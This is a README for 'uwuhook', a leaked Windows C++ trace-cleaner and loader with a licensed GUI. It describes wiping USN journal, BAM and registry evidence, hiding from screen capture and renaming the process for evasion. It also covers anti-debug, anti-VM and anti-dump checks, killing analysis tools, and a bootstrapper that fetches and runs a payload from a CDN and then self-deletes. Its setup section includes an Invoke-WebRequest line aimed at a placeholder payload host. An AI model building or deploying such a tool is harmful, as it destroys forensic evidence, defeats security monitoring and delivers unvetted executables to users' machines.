# uwuhook

A 64-bit Windows 10/11 usermode application written in C++ that provides comprehensive trace cleaning and forensic removal capabilities, wrapped in a modern ImGui-based GUI with multi-layer anti-analysis protection.

> [!NOTE]
> **Project Origin & Attribution**: This source code was self-leaked by the original author (ego / @humbleness on Discord) for educational purposes. Please do not redistribute without giving credit. Original project site: https://uwuhook.club

> [!WARNING]
> This application interacts with sensitive system areas including process memory, the registry, USN journals, and kernel-level drivers. It is intended for educational and security research purposes only.

---

## Features
* **Trace Cleaner**: Scans and wipes specific strings from live process memory using a `c_cleaner::clear_memory` routine, with an optional DPS (Deeper Cleaning) mode for more thorough removal.
* **Registry Cleaning**: Targeted deletion of registry keys and values via `c_cleaner::clear_regedit`, removing forensic artifacts left behind by monitored applications.
* **USN Journal Wiping**: Calls `c_cleaner::clear_usn_journal` to delete NTFS file operation records from the Change Journal on a specified drive (requires Administrator).
* **BAM Trace Removal**: Clears Background Activity Moderator evidence via `c_cleaner::clear_bam_traces`, removing records of recently executed binaries (requires Administrator).
* **Pattern-Based File Deletion**: `c_cleaner::delete_file` removes files matching a name pattern from a given path, supporting `%temp%` and other environment variable expansions.
* **Comprehensive Module Cleaning**: The `modules::c_modules` class orchestrates multi-stage cleaning across processes, services, system cache, network settings, free-space wiping, and USN journals.
* **Streamer Mode**: Applies `WDA_EXCLUDEFROMCAPTURE` via `SetWindowDisplayAffinity` and removes the window from the taskbar using `ITaskbarList`, hiding the tool from screen capture software.
* **Bootstrapper / Injector**: `inject.hpp` provides a `bootstrap()` routine that downloads and executes a secondary payload from a CDN URL, then self-deletes using VMProtect-guarded `ShellExecuteA`.
* **Process Rename**: `LegitRename::Rename()` in `headers/rename.h` changes the running process's name at runtime for evasion.
* **Embedded Startup Sound**: A 361KB WAV file is stored inline in `headers/intro.h` as `wavData[]` and played via `PlaySoundA` on launch.

---

## Multi-Layer Protection System

The `protection/` subsystem provides staged anti-analysis coverage controllable via `ProtectionStage` enum:

| Stage | Enum | Behaviour |
| :--- | :--- | :--- |
| None | `STAGE_NONE` | All protections disabled |
| Initial | `STAGE_INITIAL` | Anti-dump + thread hiding |
| Continuous | `STAGE_CONTINUOUS` | Anti-debug + process scanning loop |
| Full | `STAGE_FULL` | All checks active (default at startup) |

### Protection Checks (`protection/checks/`)

| Module | Files | Description |
| :--- | :--- | :--- |
| **Anti-Attach** | `anti_attach.cpp/.h` | Prevents debugger attachment to the process |
| **Anti-Debugger** | `anti_debugger.cpp/.h` | Detects and blocks active debugging attempts |
| **Anti-Dump** | `anti_dump.cpp/.h` | Prevents memory dump extraction |
| **Anti-VM** | `anti_vm.cpp/.h` | Detects virtual machine environments and exits |
| **Integrity Check** | `integrity_check.cpp/.h` | Validates application image integrity at runtime |
| **Kill Process** | `kill_process.cpp/.h` | Terminates known monitoring/analysis processes |
| **Protect Main** | `protectmain.cpp/.h` | Orchestrates all stages via `mainprotect(ProtectionStage)` |

### Obfuscation Libraries (`protection/`)

* **VMProtect** (`VMProtect/`): SDK headers + `VMProtectSDK64.dll`/`.lib` used to wrap sensitive routines in `VMProtectBeginUltra` / `VMProtectBegin` / `VMProtectEnd` blocks.
* **Lazy Importer** (`lazy importer/lazy_importer.hpp`): Resolves Windows API imports at runtime to avoid static import table analysis.
* **ObfusHeader** (`obfusheader/obfusheader.h`): Compile-time obfuscation macros applied to constants and control flow throughout the codebase.

---

## Authentication System (`libs/keyauth/`)

Login is handled through the [KeyAuth](https://keyauth.win) API using the files in `libs/keyauth/`:

| File | Role |
| :--- | :--- |
| `auth.hpp` | Main KeyAuth API wrapper (`api` class, `license()`, `init()`) |
| `json.hpp` | Bundled JSON parser for API response handling |
| `skStr.h` | `skCrypt` compile-time string encryption for API credentials |
| `utils.hpp` | Utility helpers for the auth flow |

The login page presents a key input field, a server selector (United Kingdom / Russia), and a **Save credentials** checkbox that writes the license key to `C:\license.uwu` (or `%USERPROFILE%\Documents\license.uwu` as fallback). Successful authentication advances to the panel selection page.

---

## User Interface

Built on **Dear ImGui** (DirectX 11 backend) with a FreeType font renderer. Window dimensions are fixed at **480 × 420** pixels. The UI is split into two pages:

### Page 0 — Register
Key entry, server selection, login/exit buttons, streamproof toggle, and credential save option.

### Page 1 — Panel Selection
A three-entry list with status indicators and a simulated human-like loading progress bar (randomised jitter, easing, and occasional stalls):

| Entry | Description | Status |
| :--- | :--- | :--- |
| Trace Cleaner | Universal memory/registry/file cleaner | Undetected |
| Roblox External | External cheat loader (placeholder) | In Development |
| Github | Opens developer socials/repository | Undetected |

---

## Project Structure

```
uwuhook/
├── build/Release/          # Compiled output: license.bin, VMProtectSDK64.dll
├── cleaner/                # Core cleaning engine
│   ├── cleaner.cpp/.hpp    # c_cleaner: memory, registry, USN, BAM, file deletion
│   ├── memory.cpp/.hpp     # Low-level memory read/write helpers
│   ├── modules.cpp/.hpp    # c_modules: orchestrates full cleaning pipeline
│   └── utils.hpp           # Shared utilities for the cleaner
├── headers/
│   ├── intro.h             # Embedded WAV startup sound (361KB inline byte array)
│   ├── protection.h        # Protection:: namespace wrapper (enable_full/basic/etc.)
│   └── rename.h            # LegitRename: runtime process name spoofing
├── icons/                  # Application icons (SteelSeries / Vencord disguise assets)
├── imgui/                  # Dear ImGui source + FreeType integration
│   └── backend/            # imgui_impl_dx11 + imgui_impl_win32
├── libs/
│   ├── keyauth/            # KeyAuth API: auth.hpp, json.hpp, skStr.h, utils.hpp
│   └── xor/xorstr.hpp      # Compile-time XOR string encryption
├── main/
│   ├── includes.hpp        # All standard + Windows + external headers
│   ├── inject.hpp          # bootstrap(): CDN payload download + execution
│   ├── main.cpp            # Entry point, Win32 window, DX11 render loop
│   ├── main.hpp            # c_main class, KeyAuth init, UI page definitions
│   └── product.hpp         # TimeManager: timestamp parsing for panel status
├── protection/
│   ├── checks/             # Anti-attach, anti-debug, anti-dump, anti-VM, integrity, kill-process
│   ├── lazy importer/      # lazy_importer.hpp: runtime API resolution
│   ├── obfusheader/        # obfusheader.h: compile-time code obfuscation
│   └── VMProtect/          # VMProtectSDK.h + SDK64 DLL/LIB
├── ui/
│   ├── fonts.hpp           # Font atlas definitions (fonts_ enum, FreeType config)
│   └── ui.cpp/.hpp         # Render loop helpers, page system, child window wrappers
├── catpaw client loader.vcxproj   # Visual Studio project file
├── library_x64.lib                # Precompiled support library
├── resource.h                     # Windows resource definitions
├── uwuhook.rc                     # Resource script (icons, version info)
└── uwuhook.sln                    # Visual Studio solution
```

---

## Quick Setup

### 1. Prerequisites
* Visual Studio 2022 with the **Desktop development with C++** workload
* Windows SDK 10.0+
* DirectX SDK (or use the Windows SDK bundled version)

### 2. Compile
1. Open [uwuhook.sln](uwuhook/uwuhook.sln) in Visual Studio.
2. Build under **Release | x64** to produce the loader executable.
3. The `build/Release/` directory must contain `VMProtectSDK64.dll` alongside the compiled binary at runtime.

### 3. Configure
Before building, update the KeyAuth credentials in `main/main.hpp`:
```cpp
std::string name    = skCrypt("your_app_name").decrypt();
std::string ownerid = skCrypt("your_owner_id").decrypt();
```
And point the CDN URL in `main/inject.hpp` to your payload host:
```cpp
"Invoke-WebRequest 'https://your-cdn-url/payload.exe' ..."
```

---

## Disclaimer
This software is provided for educational, security research, and testing purposes only. Portions of this codebase were modified, updated, or developed with the assistance of Artificial Intelligence (AI) models. The authors and contributors assume no liability for misuse, system damage, or issues arising from the deployment of this application in production or untrusted environments.
